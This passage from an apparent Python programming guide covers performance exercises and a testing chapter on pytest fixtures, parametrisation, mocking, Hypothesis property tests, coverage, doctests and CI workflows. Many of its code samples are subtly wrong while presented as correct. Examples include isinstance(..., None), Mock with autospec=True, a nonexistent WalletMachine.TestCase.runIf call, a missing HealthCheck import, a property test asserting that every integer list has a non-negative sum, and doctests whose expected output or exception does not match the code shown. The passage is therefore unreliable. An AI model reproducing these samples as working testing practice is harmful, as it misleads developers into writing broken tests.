Before reaching for any of this, run the interpreter’s own compile step over the hot function. In 3.14, dis.dis() on a specialised inner loop, or the adaptive-specialisation counters in sys._stats after a representative run, will show which bytecodes are actually being specialised and which are not. Several items on the list above were written for 3.9 and 3.10 and are no longer worth much on 3.14. Measure on the interpreter you are shipping.

Exercises 14

  1. Run the CPU-bound and I/O-bound benchmarks from 14.1 under python3.14 and python3.14t on the same machine, record both speedups, and confirm that a thread-unsafe counter produces a wrong result without a lock on the free-threaded build.
  2. Import a C extension without thread-safety declarations on a free-threaded build and record the warning, the value of sys._is_gil_enabled() afterwards, and how PYTHON_GIL=0 changes the failure mode.
  3. Write the same workload three ways — a thread pool, a process pool and asyncio.to_thread — over a blocking HTTP client, at 10, 100 and 1000 concurrent requests, and plot throughput and latency percentiles for each.
  4. Demonstrate the BrokenProcessPool failure by calling os._exit inside a worker, and show that a forkserver context with per-worker engine initialisation avoids the inherited-connection variant.
  5. Measure per-task event-loop cost at 100 Hz and 100 kHz, compare it with thread creation cost, and identify the crossover concurrency for a real workload in the guide’s repository.
  6. Profile a deliberately quadratic function with cProfile, then with py-spy against a running server, and explain every difference between the two attributions.
  7. Attribute a 200 MB growth to source lines with two tracemalloc snapshots, then show that sys.getsizeof reports a number three orders of magnitude smaller, and reconcile the difference.
  8. Build an object graph containing a cycle with a __del__, show it surviving in gc.garbage, replace the back-pointer with a weakref, and confirm the collection difference with gc.set_debug(gc.DEBUG_SAVEALL).
  9. Run the full benchmark set in 14.7 on a GIL build and on a free-threaded build, and identify which optimisations the specialising interpreter has made unnecessary by 3.14.
  10. Add an initializer to a ProcessPoolExecutor that creates one SQLAlchemy Engine per child, and demonstrate the difference between querying from the child and receiving a connection handle from the parent.

15 · Testing and Quality

15.1 Fixtures and conftest.py15.2 Parametrisation and exception paths15.3 Mocking and the lookup rule15.4 Property-based testing with Hypothesis15.5 Coverage as a signal15.6 Doctests15.7 Test execution in CI

Python’s testing ecosystem is a set of conventions rather than a framework. pytest is the runner, fixtures are its dependency-injection mechanism, and unittest.mock remains in the standard library for the cases where a mock is genuinely the right instrument. The philosophy that follows from this is the same one the rest of the guide takes: test the behaviour at a boundary, let the types and the types of the interfaces do as much of the work as they can, and measure what the suite costs so that it stays runnable.

15.1 Fixtures and conftest.py

A fixture is a named, cached setup function that pytest resolves from a test’s parameters. The name is the dependency: a test declares the resources it needs by listing fixture names, and pytest builds the object graph, caches each fixture for the duration of its scope, and tears it down when the scope ends. The effect is dependency injection without a container, and it replaces four separate mechanisms that the standard library’s unittest offers: setUp, tearDown, setUpClass and shared class state.

# conftest.py at the repository root, or any parent directory of the tests.
# pytest collects conftest.py from the root down to the test file's directory.
# It is the place for fixtures shared across packages, for plugin loading, and
# for the hooks that alter collection. It is NOT importable as a module by
# ordinary code, and it must never contain a top-level import with a side
# effect that the application depends on.
from __future__ import annotations

import sqlite3
from typing import Iterator

import pytest

# --- Scope -----------------------------------------------------------------
# function (default) once per test function
# class         once per test class
# module        once per test module
# package       once per test package
# session       once for the whole run -- the only scope worth paying for

@pytest.fixture(scope="session")
def db_path(tmp_path_factory: pytest.TempPathFactory) -> str:
    """One temporary file for the whole session; removed by pytest afterwards."""
    return str(tmp_path_factory.mktemp("db") / "test.sqlite3")

@pytest.fixture(scope="session")
def engine(db_path: str):
    import sqlalchemy as sa
    eng = sa.create_engine(f"sqlite+pysqlite:///{db_path}")
    sa.MetaData().create_all(eng)               # real DDL against a real file
    yield eng                                    # teardown runs after the yield
    eng.dispose()

@pytest.fixture
def conn(engine):                                # function scope: one per test
    with engine.connect() as c:
        trans = c.begin()                        # committed per test: see below
        yield c
        trans.rollback()                         # undo everything the test did

# --- Requesting another fixture is how composition works --------------------
@pytest.fixture
def customer(conn) -> dict:
    return {"id": 1, "name": "acme", "tier": "gold"}

@pytest.fixture
def order(customer) -> dict:
    return {"id": 10, "customer_id": customer["id"], "total": 4999}

def test_order_shape(customer, order) -> None:
    """customer and order are built, in dependency order, before the body runs."""
    assert order["customer_id"] == customer["id"]

# --- Autouse: a fixture every test in a scope gets, without asking ----------
@pytest.fixture(autouse=True)
def reset_state(conn) -> Iterator[None]:
    yield
    conn.rollback()                               # the belt to the braces above

# --- Temporaries -----------------------------------------------------------
# tmp_path  one directory per test, function-scoped, created under the base
#           temporary directory and removed at the end of the session run.
# tmp_path_factory  session-scoped factory for cases that need a shared path.
# Never use the tempfile module directly in a test: the directory is not
# cleaned up deterministically and parallel runs collide.

# --- Yield, or return ------------------------------------------------------
# A fixture returning a value is set up and never torn down. A fixture with a
# yield is set up before and torn down after, which is how a real context
# manager, a real connection or a real thread is released -- even if the test
# raises, because the generator's close is driven by the fixture finaliser.

# --- Parameterised dependencies -------------------------------------------
@pytest.fixture(params=["sqlite", "postgresql"])
def dialect(request: pytest.FixtureRequest) -> str:
    """One test, run once per dialect, with the dialect selected by param."""
    return str(request.param)

def test_runs_on_both(dialect: str) -> None:
    assert dialect in {"sqlite", "postgresql"}

# --- Overriding ------------------------------------------------------------
# A fixture defined in a test module or a subdirectory conftest.py REPLACES one
# of the same name from a parent conftest.py. This is the mechanism by which a
# test suite swaps a real database for an in-memory one without the
# application code knowing.
# conftest.py at tests/integration/conftest.py:
#     @pytest.fixture
#     def engine(): yield FakeEngine()            # shadows the real one above

# --- Factories versus shared state ----------------------------------------
# A fixture that returns a FACTORY is better than a fixture that returns a
# mutated object: each test calls the factory, so no test can see another
# test's changes and the number of objects a test creates is explicit.
@pytest.fixture
def make_account():
    def _make(name: str = "acme", **kw) -> dict:
        return {"id": 1, "name": name, **kw}
    return _make

def test_two_accounts(make_account) -> None:
    a = make_account("a")
    b = make_account("b")
    assert a is not b and a["name"] != b["name"]

Fixture scope is a caching decision and a cost decision. A function-scoped fixture runs once per test; a session-scoped one runs once per run. Making a fixture session-scoped because it is slow is the most common cause of a suite that cannot run in parallel, because a session-scoped fixture is inherently shared state. The two rules that keep a suite parallelisable: nothing at session scope is mutated by a test, and anything a test mutates is function-scoped. Marking a session fixture as read-only by convention is not enforcement; a readonly=True generator or a frozen dataclass is.

Import-time work in conftest.py is paid by every test in the run, and pytest’s assertion rewriting reads and caches the AST of every imported test module. A large conftest.py that imports an application package which in turn connects to a database produces a suite that fails to collect when the database is down — and the failure appears before any test runs, which reads as a broken test runner. Keep conftest import-time work to plugin registration and pure configuration.

15.2 Parametrisation and exception paths

A test that enumerates its own inputs through parameters produces better failure messages than a loop inside one test function, and it lets pytest report each case separately. The related question — how to test a function that is supposed to raise — has a correct answer in pytest and no equivalent in bare assert, because an exception is not a value that an expression can compare.

from __future__ import annotations

import pytest
from decimal import Decimal

# --- parametrize -----------------------------------------------------------
def slugify(text: str) -> str:
    return "-".join(text.lower().split())

@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("Hello World", "hello-world"),
        ("  leading and trailing  ", "leading-and-trailing"),
        ("UPPER", "upper"),
        ("", ""),
        ("a  b", "a-b"),
    ],
    ids=["basic", "whitespace", "case", "empty", "internal-double-space"],
)
def test_slugify(raw: str, expected: str) -> None:
    assert slugify(raw) == expected

# Without ids, pytest generates them from the values. Explicit ids are worth
# writing for anything with more than a handful of cases: "test_slugify[0]"
# tells the reader nothing, "test_slugify[whitespace]" tells them what broke.

# --- One parameter list per axis: the cartesian product --------------------
@pytest.mark.parametrize("width", [1, 2, 4, 8])
@pytest.mark.parametrize("align", ["left", "right"])
def test_layout(width: int, align: str) -> None:
    assert width > 0 and align in {"left", "right"}

# 4 x 2 = 8 tests. Note the ORDER of the resulting ids: the decorator closest
# to the function varies fastest. This matters when a test is slow.

# --- Stacking parametrize by stacking, not by nesting --------------------
# Two @parametrize decorators on one test give a PRODUCT. To get a TUPLE of
# specific combinations, put them in one parametrize with one argument name.
@pytest.mark.parametrize("op, expected", [
    (lambda a, b: a + b, 7),
    (lambda a, b: a * b, 12),
    (lambda a, b: a - b, -1),
], ids=["add", "mul", "sub"])
def test_ops(op, expected) -> None:
    assert op(3, 4) == expected

# --- Parametrising a class: every test in it runs for every parameter ------
@pytest.mark.parametrize("value", [0, 1, -1, 2**63])
class TestBoundary:
    def test_is_int(self, value: int) -> None:
        assert isinstance(value, int)
    def test_roundtrip(self, value: int) -> None:
        assert int(str(value)) == value

# --- Exception paths -------------------------------------------------------
class ValidationError(ValueError): ...

def parse_port(value: str) -> int:
    n = int(value)
    if not 1 <= n <= 65535:
        raise ValidationError(f"port out of range: {value}")
    return n

# pytest.raises() is a CONTEXT MANAGER: the block must raise, or the test
# fails. It returns an ExceptionInfo whose .value is the exception instance.
def test_rejects_zero() -> None:
    with pytest.raises(ValidationError, match=r"out of range"):
        parse_port("0")

def test_exception_value_is_available() -> None:
    with pytest.raises(ValidationError) as excinfo:
        parse_port("70000")
    assert "70000" in str(excinfo.value)
    assert excinfo.type is ValidationError
    assert isinstance(excinfo.value.__cause__, None)     # no chaining here

# The error type. pytest.raises(ValueError) also passes for a subclass, which
# is usually what you want, and it also passes for a TypeError raised by
# mistake. Asserting excinfo.type is the way to be exact.
def test_wrong_type_is_caught() -> None:
    with pytest.raises(TypeError):                      # int("abc") raises this
        parse_port("abc")

# Match: a regex searched in str(exception), not matched against the whole
# string. Keep it tight; a loose pattern makes the test pass for the wrong
# reason. NOTE the escaping: regex metacharacters must be escaped or removed.

# Multiple expected failures, parametrised:
@pytest.mark.parametrize("raw", ["0", "65536", "-1", "999999"])
def test_all_rejected(raw: str) -> None:
    with pytest.raises(ValidationError):
        parse_port(raw)

# --- Warning and log assertions: a deprecation IS a testable behaviour ------
def test_deprecation_is_warned() -> None:
    with pytest.warns(DeprecationWarning, match="use parse_port instead"):
        legacy_parse("80")

def legacy_parse(value: str) -> int:
    import warnings
    warnings.warn("use parse_port instead", DeprecationWarning, stacklevel=2)
    return parse_port(value)

# --- Testing that something does NOT happen -------------------------------
# A caplog fixture makes the absence of a log record assertable, which is the
# only reliable way to prove a code path is not taken -- a mock that is never
# called raises no error by itself.
def test_no_warning_emitted(caplog: pytest.LogCaptureFixture) -> None:
    with caplog.at_level("DEBUG"):
        parse_port("443")
    assert caplog.records == []

# --- Type-driven skipping -------------------------------------------------
requires_postgres = pytest.mark.skipif(
    not pytest.importorskip, reason="unused"
)
@pytest.mark.skipif(True, reason="disabled while the migration is in flight")
def test_pending() -> None:
    ...

# --- The right granularity ------------------------------------------------
# One test per behaviour, not one test per branch. A loop inside a test that
# stops at the first failure leaves the remaining cases unexamined; a
# parametrised test reports all of them. But do not parametrise a case that
# differs in setup rather than in input: that is two tests wearing one name.

Assert on the value and the message separately: pytest.raises(E, match=...) checks the type and the message together, which is convenient but makes the failure message terse. For a library whose exception messages are part of its contract, the exception hierarchy and the message text are both public API, and both deserve their own assertions.

15.3 Mocking and the lookup rule

A mock replaces a collaborator so that a unit can be tested without it. unittest.mock is in the standard library and is not deprecated; the mock package on PyPI exists only for Python 2 compatibility. The essential rule is about where the replacement is installed, and getting it wrong is the reason mocking has a reputation for producing tests that pass and code that does not work.

from __future__ import annotations

from unittest.mock import (
    MagicMock, Mock, AsyncMock, patch, call, sentinel, ANY, PropertyMock,
)
import unittest.mock as m

# --- The lookup rule -------------------------------------------------------
# A name is resolved at the moment it is USED, not at the moment it is
# imported. The target of a patch is therefore the namespace where the lookup
# happens.
#
#   from package.module import thing   -- patches package.module.thing
#                                         NOT the caller's `thing`
#   import package.module               -- patches package.module.thing
#   from package import module          -- patches package.module.thing
#
# Inside the module under test, patch the name as that module sees it.

# --- Three mock flavours ---------------------------------------------------
m1 = Mock()                                  # spec-less: anything goes
m2 = Mock(spec=["read", "write"])            # only these attributes exist
m3 = MagicMock()                             # + __len__, __iter__, __bool__, etc.
m4 = Mock(spec=SomeClass)                    # the instance's interface
m5 = Mock(spec=SomeClass, autospec=True)     # the class's interface

# MagicMock is required whenever the code under test uses a dunder on the
# object, because Mock does not configure magic methods and calling one raises
# AttributeError. Using MagicMock by default avoids a class of confusing
# failure; autospec=True on a MagicMock gives the interface check for free.
sentinel = m.sentinel.sentinel_value          # a unique, unmistakable object

# --- A worked example ------------------------------------------------------
class Gateway:
    def __init__(self, client) -> None:
        self.client = client
    def fetch_order(self, order_id: int) -> dict:
        path = f"/orders/{order_id}"
        response = self.client.get(path)       # the lookup happens HERE
        if response.status_code != 200:
            raise LookupError(f"order {order_id}: HTTP {response.status_code}")
        return response.json()

import requests
def test_fetch_order_parses_json() -> None:
    with patch("mymodule.requests.get") as mock_get:   # patch where it is looked up
        mock_get.return_value.status_code = 200
        mock_get.return_value.json.return_value = {"id": 7}
        assert Gateway(requests).fetch_order(7) == {"id": 7}
        mock_get.assert_called_once_with("/orders/7")

def test_fetch_order_raises_on_404() -> None:
    with patch("mymodule.requests.get") as mock_get:
        mock_get.return_value.status_code = 404
        with pytest_raises_lookalike():
            Gateway(requests).fetch_order(7)

def pytest_raises_lookalike():                  # a stand-in for the context manager
    import pytest
    return pytest.raises(LookupError)

# --- patch versus patch.object versus autospec ----------------------------
class Service:
    def __init__(self, transport) -> None:
        self.transport = transport
    def call(self) -> str:
        return self.transport.send("ping").text

def test_patch_object_replaces_an_attribute() -> None:
    svc = Service(transport=MagicMock())
    with patch.object(svc.transport, "send") as mock_send:
        mock_send.return_value.text = "pong"
        assert svc.call() == "pong"
        mock_send.assert_called_once_with("ping")

def test_autospec_checks_the_signature() -> None:
    with patch("mymodule.Gateway.fetch_order", autospec=True) as mock_fetch:
        mock_fetch.return_value = {"id": 1}
        Gateway(requests).fetch_order(1)
        mock_fetch.assert_called_once()          # the SELF argument is checked
        mock_fetch.assert_called_once_with(
            ANY, 1                                 # ANY because the instance differs
        )
# autospec=True builds the mock from the real object, so a renamed method, a
# changed signature or an extra required argument fails the test at the call
# rather than silently passing against a permissive mock.

# --- Async -----------------------------------------------------------------
import asyncio
async def main() -> None:
    client = AsyncMock()
    client.fetch.return_value = {"id": 1}
    assert await client.fetch(1) == {"id": 1}
    client.fetch.assert_awaited_once_with(1)
asyncio.run(main())

# An AsyncMock tracks await COUNT separately, and assert_called_once_with on
# an async function does not see the await. Use assert_awaited_once_with.
# Patching an async function with a plain MagicMock returns a MagicMock, and
# awaiting a MagicMock fails; patch with new_callable=AsyncMock (autospec
# infers it correctly from an async def).

# --- Where NOT to mock -----------------------------------------------------
# 1. Do not mock what you do not own. A mock of a third-party library encodes
#    an assumption about that library's behaviour, and the assumption is
#    wrong the day the library changes. Record and replay at your own boundary
#    (VCR, a fake server) instead.
# 2. Do not mock the standard library to change its behaviour. If
#    time.sleep is in the way, inject a clock; do not patch time.sleep and
#    then have to reason about the code's interaction with the mock.
# 3. Do not mock the thing under test's own collaborators when a real,
#    cheap, in-memory implementation exists. A mock of a repository proves the
#    service calls the repository; it proves nothing about the repository.
# 4. Do not assert on the mock beyond the interaction that matters.
#    assert_called_with on a method called four times with different arguments
#    is a test that breaks on every legitimate change.

# --- Fakes and stubs, preferred to mocks ----------------------------------
class FakeClock:
    """A controllable clock. The interface matches the real one; the
    implementation is 20 lines and cannot drift, because it is in this repo."""
    def __init__(self, start: float = 0.0) -> None:
        self.now = start
    def time(self) -> float:
        return self.now
    def sleep(self, seconds: float) -> None:
        self.now += seconds
    def advance(self, seconds: float) -> None:
        self.now += seconds

def test_retry_backoff_uses_the_injected_clock() -> None:
    clock = FakeClock()
    delays = retry_with_backoff(clock, attempts=3, base=1.0)
    assert delays == [1.0, 2.0]        # deterministic, no patching, no sleeping

def retry_with_backoff(clock, attempts: int, base: float) -> list[float]:
    return [base * 2**i for i in range(attempts - 1)]

The four classic mocking mistakes, in order of frequency: patching the wrong namespace, so the mock is never called and the test passes for the wrong reason; using a spec-less mock, so a typo in the method name is silently accepted and the assertion is vacuous; over-specifying interactions, so the test breaks on a harmless refactor; and mocking an object whose real behaviour is what is being tested. The defences are autospec=True by default, assert_called_once rather than assert_called, and a rule that a test with more than two mocks in it is testing the mocks.

15.4 Property-based testing with Hypothesis

Example-based testing proves that stated cases hold. Property-based testing generates inputs to prove that a statement holds for all of them. The statement is the specification: a law, an invariant, a relationship. Hypothesis (a mature third-party library, installed from PyPI) is the standard tool, and its contribution beyond random input is shrinking — when a failing example is found, it reduces it to the smallest input that still fails, which is the input that actually tells you what is wrong.

# pip install hypothesis
from __future__ import annotations

import math
import string
from hypothesis import given, settings, strategies as st, assume, example, seed

# --- Strategies: the input space ------------------------------------------
#   st.integers(min_value=, max_value=)
#   st.floats(allow_nan=False, allow_infinity=False, width=32)
#   st.text(alphabet=st.characters(min_codepoint=32, max_codepoint=126))
#   st.lists(st.integers(), min_size=1)
#   st.dictionaries(st.text(min_size=1), st.integers())
#   st.builds(Account, ...)      a dataclass or class by constructor args
#   st.composite                 an arbitrary generator for a custom type
#   st.sampled_from([...])       draw from a closed set
#   st.one_of(...)               a union
#   st.recursive(...)            a self-referential structure, bounded

# --- The example-based default, and the property that replaces it ---------
def reverse(s: str) -> str:
    return s[::-1]

@given(st.text())
def test_reverse_involutive(s: str) -> None:
    assert reverse(reverse(s)) == s              # the property

@example(s="")                                    # a known edge case, always run
@example(s="a b")
def test_reverse_length(s: str) -> None:
    assert len(reverse(s)) == len(s)

# --- Shrinking, demonstrated ----------------------------------------------
# A bug that only appears when a list has an even number of elements and the
# middle two are equal. Hypothesis reports the SMALLEST failing input, which
# is [1, 1], not a 200-element list that happens to contain it.

# --- A composite strategy for a domain object ------------------------------
@st.composite
def accounts(draw: st.DrawFn) -> dict:
    return {
        "id": draw(st.integers(min_value=1, max_value=10**6)),
        "name": draw(st.text(min_size=1, max_size=40)),
        "balance_cents": draw(st.integers(min_value=0, max_value=10**12)),
    }

@given(accounts())
def test_balance_never_negative(a: dict) -> None:
    assert a["balance_cents"] >= 0

# --- Invariants over a model ---------------------------------------------
# A model-based test generates a SEQUENCE of operations, applies them to both
# a real object and a simple model, and asserts the two agree after every step.
# This finds ordering-dependent bugs that no single-call test can reach.
from hypothesis.stateful import RuleBasedStateMachine, invariant, rule

class WalletMachine(RuleBasedStateMachine):
    def __init__(self) -> None:
        self.wallet = {"balance": 0}
        self.model = 0

    @rule(amount=st.integers(min_value=1, max_value=1000))
    def deposit(self, amount: int) -> None:
        self.wallet["balance"] += amount
        self.model += amount

    @rule(amount=st.integers(min_value=1, max_value=10**6))
    def try_withdraw(self, amount: int) -> None:
        if self.wallet["balance"] >= amount:
            self.wallet["balance"] -= amount
            self.model -= amount

    @invariant()
    def consistent(self) -> None:
        assert self.wallet["balance"] == self.model

WalletMachine.TestCase.runIf(__name__ == "__main__")
# Hypothesis runs the state machine, shrinking any failing operation sequence
# to the shortest one that reproduces the bug. This is the highest-value tool
# in the ecosystem for a codebase with state.

# --- Settings: the budget, and where it should go --------------------------
@settings(max_examples=500, deadline=None,
          suppress_health_check=[HealthCheck.too_slow])
@given(st.lists(st.integers(), min_size=1))
def test_sum_positive(xs: list[int]) -> None:
    assert sum(xs) >= 0
# max_examples is the default budget: 100 examples per test. Raise it for a
# property that rarely fails, lower it for a suite that must be fast. The
# deadline (200 ms by default) is what makes a slow CI machine fail a test for
# being slow rather than for being wrong; deadline=None disables it and is the
# right setting for anything that does real work.
# The health checks fire on an input space that is producing too many
# discarded or duplicate examples -- usually a sign the strategy is too broad.

# --- Filtering with assume -------------------------------------------------
@given(st.integers())
def test_divisor_is_smaller(n: int) -> None:
    assume(n > 1)                              # 0, 1 and negatives are out of scope
    assert n // 2 < n
# assume() discards the example rather than testing it. Too much filtering makes
# a test slow and weak: the test then says nothing about the discarded half.
# Filter in the STRATEGY (composite, or st.integers(min_value=2)) instead.

# --- Where properties are worth the cost ----------------------------------
# - Pure functions with an algebraic law: commutativity, associativity,
#   idempotence, inverse, round-trip.
# - Serialisation: encode then decode must be the identity.
# - Parsers: any input must produce a value or a defined error, never a crash
#   and never a hang.
# - Data structures: an insert-then-get must return what was inserted, for any
#   key; a sorted sequence must remain sorted after any insertion.
# - Serialisation invariants: a value written by version N is readable by
#   version N+1 (see A.4 for a real example of where this goes wrong).

Requirements: the property must be true for the WHOLE generated space, not for a sample. A property that is only true for values the implementation happens to produce will eventually be falsified, and that is the tool working correctly rather than a false positive. Caveats: a property test can be slow and a stateful one can be slower; a hypothesis profile registered in conftest.py (for example hypothesis.settings.register_profile("ci", max_examples=200, deadline=None)) is how a suite keeps a deterministic budget. And a property test that generates st.text() over the full Unicode range will find encoding bugs that no realistic example reaches, which is precisely the argument for using it.

15.5 Coverage as a signal

Line coverage measures which lines executed. It is a weak proxy for test quality, and treating it as a target produces the specific failure mode it is meant to detect: code written to be covered rather than code that works. Branch coverage, which measures both outcomes of each decision, is strictly more informative and still not sufficient. The defensible uses of coverage are narrow, and they are about finding gaps rather than proving completeness.

# pip install pytest-cov coverage
#   pytest --cov=acme_tools --cov-branch --cov-report=term-missing
#   pytest --cov=acme_tools --cov-report=html --cov-report=xml
#   uv run pytest --cov --cov-fail-under=80
#
# .coveragerc / [tool.coverage.*]
#   [tool.coverage.run]
#   branch = true
#   source = ["acme_tools"]
#   omit = ["*/tests/*", "*/migrations/*", "*/__main__.py"]
#   parallel = true            # for a distributed run; combine afterwards
#   [tool.coverage.report]
#   show_missing = true
#   skip_covered = true
#   exclude_also = [
#     "if TYPE_CHECKING:",
#     "raise NotImplementedError",
#     "@(abc\\.)?abstractmethod",
#     "if __name__ == .__main__.:",
#   ]
#   fail_under = 80            # a ratchet, not a target
#   [tool.coverage.json]
#   output = "coverage.json"

# --- The three legitimate uses ---------------------------------------------
# 1. FINDING UNTESTED CODE. A module at 3% is untested, whatever its line
#    count. Read the missing-lines report, not the percentage.
# 2. RATCHING. fail_under rises over time and never falls. A change that
#    lowers coverage fails CI; a change that raises it does not require
#    approval. This makes the metric a floor that cannot regress, which is a
#    legitimate use and a modest one.
# 3. FINDING DEAD CODE. A line that is never executed across a whole
#    integration environment is, with high probability, unreachable. A line
#    that is never executed but is obviously reachable is a signal that the
#    tests are not exercising the path that reaches it.

# --- Why the percentage is not a quality measure ---------------------------
# 100% line coverage with no assertion in any test is a suite that proves the
# program runs and nothing else. A single test that calls every public
# function in a module achieves 100% and detects no defect.
# Conversely, a well-tested numerical algorithm with a 61% line count and
# strong boundary tests is better tested than a controller with 92%.
# The number cannot distinguish these, which is why it must not be the target.

# --- Where coverage actively misleads -------------------------------------
# - It counts executed lines, so a line that is executed on every path but
#   asserts nothing contributes exactly as much as one that is asserted.
# - A generated or framework-decorated line (an @app.route body, a pydantic
#   validator, a dataclass __eq__) inflates the denominator and dilutes the
#   signal. omit them.
# - It cannot see a defect inside a line, a wrong assertion, or a missing
#   case for an executed branch. 100% of assertions can all be wrong.
# - Concurrency: a line executed by a code path that only fails under
#   contention counts exactly the same.

# --- Metrics that are strictly better, and none of which is sufficient -----
#   mutation testing (mutmut, cosmic-ray)  -- changes operators and constants
#     and requires the test suite to fail. It measures whether the ASSERTIONS
#     can detect a defect, which is the actual question. Expensive: 10-100x
#     the suite, so run it nightly on the core module, not per commit.
#   branch coverage                         -- the decision outcomes, not just
#     the line. enable it; it costs nothing extra at collection time.
#   the number of distinct failure modes a suite can distinguish, which is
#     hard to automate and is the only number that matters.
Code under testIs a unit test worth writingForm
Pure function with real logic: parsing, formatting, arithmetic, a state machineYes, alwaysExample-based plus at least one property-based test for the laws
Code that exists only to satisfy an interface, with no logic of its ownOnly if the interface has a non-obvious contractSkip; a test of a pass-through is a test of the mock
Error handling whose only content is a log call and a re-raiseNoCovered incidentally by the failing test that caused it
Configuration loading and environment detectionYes, if the environment variesParametrised over a fake environment; the highest-value use of parametrise
ORM models and migrationsYes, thinlyA round-trip and a constraint test per model; the rest is integration
Third-party library behaviourNoTest that the library is called, and test your code against a real instance of it
Generated code, __repr__, trivial accessorsNoCoverage exclude_also and move on
Concurrency primitives, locks, queuesYes, and it is the hardest work there isStress tests with a real thread pool, plus a state model if the invariants are subtle (see 15.4)
Anything where a defect is expensive: money, permissions, migrationsYes, exhaustively, and then someProperty-based tests and mutation testing; these are the modules where the coverage percentage is least informative

15.6 Doctests

A doctest is an example in a docstring that is also a test: a >>> prompt, the expression, and the exact expected output. doctest is in the standard library, pytest collects doctests with --doctest-modules, and the two together give documentation that cannot drift from behaviour. The tension is real and worth stating plainly, because the format is a poor fit for most documentation.

import doctest
from typing import Sequence

# --- A doctest that earns its keep ----------------------------------------
def normalise(name: str) -> str:
    """Return a canonical form of a package name.

    Names are compared case-insensitively and with runs of -, _ and .
    collapsed to a single separator, per PEP 503.

    >>> normalise("Acme_Tools")
    'acme-tools'
    >>> normalise("acme..tools")
    'acme-tools'
    >>> normalise("ACME-  tools")
    'acme-tools'
    >>> normalise("  acme ")
    'acme'
    """
    import re
    return re.sub(r"[-_.]+", "-", name).strip().lower()

# --- Running them ---------------------------------------------------------
#   python -m doctest -v module.py
#   pytest --doctest-modules package/
#   pytest --doctest-modules --doctest-glob='*.rst' docs/
#   python -m doctest README.rst
print(doctest.testmod(verbose=False))            # (failed, attempted)

# --- Ellipsis, flags, exceptions -----------------------------------------
def parse_port(value: str) -> int:
    """Parse a TCP port.

    Blank lines in the input are skipped.

    >>> for line in ["8080\\n", "\\n", "  443  \\n"]:
    ...     print(parse_port(line))
    8080
    443

    Raises:
        ValueError: if the port is not a number.
        ValidationError: if the port is outside 1..65535.

    >>> parse_port("0")
    Traceback (most recent call last):
        ...
    ValidationError: port out of range: 0
    """
    v = int(value)
    if not 1 <= v <= 65535:
        raise ValueError("port out of range: " + value)
    return v

# Options, in a __docformat__ or on the command line:
#   # doctest: +ELLIPSIS   ... matches any text
#   # doctest: +NORMALIZE_WHITESPACE  ignores runs of spaces and blank lines
#   # doctest: +SKIP      do not run this example
#   # doctest: +REPORT_NDIFF  shows a unified diff on failure
# doctest: +ELLIPSIS
# An example that cannot be made deterministic should be SKIPped with a
# reason, or removed. A doctest that is skipped "temporarily" is a dead test.

# --- When they earn their keep --------------------------------------------
# 1. A function whose contract is a set of concrete input/output pairs: date
#    and number formatting, parsers, codecs, canonicalisation functions.
#    Here the example IS the specification and the prose adds little.
# 2. A short session in the README or the module docstring, where the reader
#    wants to see the thing work, and where a test proves the transcript
#    still matches.
# 3. A tutorial or a quickstart, where the prose is the point and the examples
#    must execute to be credible.
# 4. Anything a REPL transcript in the documentation claims to have produced.

# --- When they do not -----------------------------------------------------
# 1. ERROR PATHS. The required output is a traceback with an exact message
#    and a specific exception class. A refactor that improves the message
#    breaks the doctest, and the fix is to change the test rather than the
#    message. The cost is a maintenance tax on the error text that a proper
#    exception test does not pay.
# 2. SUBJECT TO CHANGE. Formatting, repr, dict ordering, float rendering and
#    anything else the implementation is entitled to change without a version
#    bump. The doctest will block a legitimate change.
# 3. LONG SESSIONS. A twenty-line transcript is a test with a linear
#    maintenance cost and a readability benefit that a single-line example
#    does not provide.
# 4. NARRATIVE PROSE. A docstring that reads like a letter and contains three
#    prompt blocks is worse documentation than a docstring with one.
# 5. Performance or resource behaviour: a doctest cannot assert on a
#    threshold, and a slow doctest slows the whole suite.

# --- Practical rules -------------------------------------------------------
# One example per behaviour, each no more than three lines. Always use the
# REPL form (> > > and ...) so the output is unambiguous. Never rely on
# #doctest directives in library docstrings -- they are invisible to a reader
# in help() and in most documentation renderers. If an example must be
# skipped, skip it in the runner configuration, not in the source.

The convention that resolves the tension: use doctests for the input/output pairs that make a function’s contract concrete, and use pytest.raises (15.2) for the error paths, so the exception text remains free to improve. That split gets the documentation benefit without making the error messages load-bearing.

15.7 Test execution in CI

Continuous integration turns a test suite into a gate. The design questions are which jobs run on which trigger, how the suite is kept fast enough that people run it, and what is checked before the expensive jobs start. A suite that takes forty minutes is a suite where bugs are found in production, because the change is merged long before the failure arrives.

# pyproject.toml, the parts that matter for CI
# [tool.pytest.ini_options]
# addopts    = "-ra -q --strict-markers --strict-config -p no:randomly"
# testpaths  = ["tests"]
# markers = [
#   "slow:     takes more than a second",
#   "db:       needs a live database",
#   "network:  makes an outbound request",
#   "xfail:    known failure, tracked in an issue",
# ]
# filterwarnings = ["error", "ignore::DeprecationWarning:acme_tools.*"]
#
# Three tiers, three durations. Everything below runs on every push.
#   1. fast      < 2 min    the whole suite minus the slow marker, one job
#   2. full      < 20 min   the whole suite including slow, matrixed by
#                             Python version and operating system
#   3. scheduled nightly     mutation testing, fuzzing, long soak

# --- Markers ---------------------------------------------------------------
import pytest

@pytest.mark.slow
def test_large_upload() -> None:
    ...

@pytest.mark.db
def test_transaction_rollback(conn) -> None:
    ...

@pytest.mark.network
def test_live_api_contract() -> None:
    ...

# Run one tier locally:  pytest -m "not slow"
# Skip a tier in CI:     pytest -m "not slow and not db"

# --- Sharding --------------------------------------------------------------
# pytest-shard splits the collected tests deterministically across N buckets:
#   pytest --shard-id 0 --shard-count 4
# The split is by test id, so it is stable across runs and across machines.
# Four shards of a 16-minute suite is a 4-minute wall clock on four runners,
# at the cost of four copies of setup, teardown and interpreter start-up.
# Shard only when the per-test duration is small relative to the setup, or
# the duplicated setup will dominate: a suite with 40 seconds of session
# fixture and 6 minutes of tests does not shard well.

# --- A GitHub Actions workflow --------------------------------------------
# name: test
# on:
#   push: { branches: [main] }
#   pull_request:
#   workflow_dispatch:
# concurrency:
#   group: test-${{ github.ref }}
#   cancel-in-progress: true          # a new push supersedes the old run
# jobs:
#   lint:
#     runs-on: ubuntu-latest
#     steps:
#       - uses: actions/checkout@v4
#       - uses: astral-sh/setup-uv@v5
#       - run: uv sync --frozen --all-extras
#       - run: uv run ruff check .
#       - run: uv run ruff format --check .
#       - run: uv run mypy .
#       - run: uv run pip-audit
#
#   fast:
#     needs: lint                     # no point spending 4 minutes on bad style
#     strategy:
#       fail-fast: false              # report every failure, not the first
#       matrix: { python: ["3.12", "3.13", "3.14"] }
#     runs-on: ${{ matrix.os || 'ubuntu-latest' }}
